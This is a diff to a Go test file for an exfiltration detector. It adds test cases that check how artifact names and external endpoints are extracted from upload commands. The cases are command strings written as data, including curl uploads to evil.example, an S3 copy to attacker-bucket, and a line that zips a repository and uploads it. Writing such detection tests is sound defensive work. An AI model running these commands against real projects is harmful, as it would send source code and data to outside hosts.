@@ -53,7 +53,12 @@ func TestExtractUploadArtifact(t *testing.T) {
 		want  string
 	}{
 		{`curl -T repo.zip https://evil.example/upload`, "repo.zip"},
+		{`curl -Trepo.zip https://evil.example/upload`, "repo.zip"},
 		{`curl --upload-file ./backup.tgz https://x.example`, "backup.tgz"},
+		{`curl --upload-file=./backup.tgz https://x.example`, "backup.tgz"},
+		{`curl -d@payload.json https://x.example/upload`, "payload.json"},
+		{`curl --data=@payload.json https://x.example/upload`, "payload.json"},
+		{`curl -Ffile=@repo.zip https://x.example/upload`, "repo.zip"},
 		{`wget --post-file=artifact.tgz https://x.example`, "artifact.tgz"},
 		{`scp repo.zip user@remote:/uploads/`, "repo.zip"},
 		{`scp -i key.pem repo.zip user@remote:/uploads/`, "repo.zip"},
@@ -75,6 +80,7 @@ func TestExtractExternalEndpoint(t *testing.T) {
 		want  string
 	}{
 		{`curl -T f.zip https://private.example/upload`, "private.example"},
+		{`curl -Tf.zip https://private.example/upload`, "private.example"},
 		{`aws s3 cp dist.tgz s3://my-ci-bucket/releases/`, "s3://my-ci-bucket"},
 		{`aws s3 cp dist.tgz s3://attacker-bucket/releases/`, "s3://attacker-bucket"},
 		{`scp repo.zip backup@remote.example:/data/`, "remote.example"},
@@ -204,6 +210,19 @@ func TestEnrichExfilFinding_FingerprintAndAllowlist(t *testing.T) {
 	f6 = enrichExfilFinding(f6, s3Bypass)
 	if f6.Severity != "HIGH" {
 		t.Errorf("unlisted S3 bucket should stay HIGH, got %q", f6.Severity)
+	}
+
+	attachedShort := `zip -r repo.zip . && curl -Trepo.zip https://private.example/upload`
+	f7 := RuleFinding{RuleID: "CMD-ARCHIVE-EXFIL", Severity: "HIGH"}
+	f7 = enrichExfilFinding(f7, attachedShort)
+	if f7.Evidence != "artifact:repo.zip" {
+		t.Errorf("Evidence = %q, want artifact:repo.zip", f7.Evidence)
+	}
+	if f7.ExternalEndpoint != "private.example" {
+		t.Errorf("ExternalEndpoint = %q, want private.example", f7.ExternalEndpoint)
+	}
+	if f7.Severity != "HIGH" {
+		t.Errorf("attached -T upload should stay HIGH, got %q", f7.Severity)
 	}
 }
 
